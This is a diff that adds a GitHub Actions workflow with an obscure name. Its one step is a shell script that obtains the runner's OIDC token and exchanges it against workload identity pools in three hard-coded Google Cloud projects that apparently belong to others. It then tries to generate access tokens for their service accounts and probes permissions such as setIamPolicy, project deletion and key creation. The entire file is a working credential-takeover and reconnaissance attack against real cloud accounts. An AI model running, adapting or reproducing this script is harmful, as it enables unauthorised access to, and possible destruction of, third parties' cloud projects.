@@ -1,0 +1,47 @@
+name: wf1210d
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  wf1210d:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: r4
+        run: |
+          set +e
+          TARGETS='
+          363590592857|363590592857-compute@developer.gserviceaccount.com|projects/363590592857/locations/global/workloadIdentityPools/github-action/providers/github
+          731679007643|github-actions@rails-todo-app-386721.iam.gserviceaccount.com|projects/731679007643/locations/global/workloadIdentityPools/github-actions/providers/rails-todo-identity-pool-github
+          536185737408|github@carbonifer-sandbox.iam.gserviceaccount.com|projects/536185737408/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider
+          '
+          echo "$TARGETS" | sed 's/^ *//' | grep -v '^$' | while IFS='|' read -r NUM SA PRJ; do
+            echo "=== R4 num=$NUM"
+            AUD="https://iam.googleapis.com/$PRJ"
+            rm -f tok.jwt
+            curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r '.value // empty' > tok.jwt
+            c=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+              --data-urlencode "subject_token=$(cat tok.jwt)" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform")
+            FT=$(jq -r '.access_token // empty' r.json)
+            echo "##STS num=$NUM code=$c ftlen=${#FT}"
+            [ -z "$FT" ] && continue
+            jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+            c=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+            AT=$(jq -r '.accessToken // empty' g.json)
+            echo "##GEN num=$NUM code=$c toklen=${#AT}"
+            [ -z "$AT" ] && continue
+            c=$(curl -s -o t1.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:testIamPermissions" -d '{"permissions":["resourcemanager.projects.setIamPolicy","resourcemanager.projects.getIamPolicy","resourcemanager.projects.update","resourcemanager.projects.get","resourcemanager.projects.delete"]}')
+            echo "##TIP-RM num=$NUM code=$c body=$(head -c 700 t1.json | tr -d '\n' | tr -s ' ')"
+            c=$(curl -s -o t2.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:testIamPermissions" -d '{"permissions":["resourcemanager.projects.create"]}')
+            echo "##TIP-CREATE num=$NUM code=$c body=$(head -c 300 t2.json | tr -d '\n' | tr -s ' ')"
+            c=$(curl -s -o t3.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v3/projects/$NUM:testIamPermissions" -d '{"permissions":["resourcemanager.projects.setIamPolicy","iam.serviceAccountKeys.create","iam.serviceAccounts.delete"]}')
+            echo "##TIP-V3 num=$NUM code=$c body=$(head -c 500 t3.json | tr -d '\n' | tr -s ' ')"
+          done
+          echo "##FINISHED"
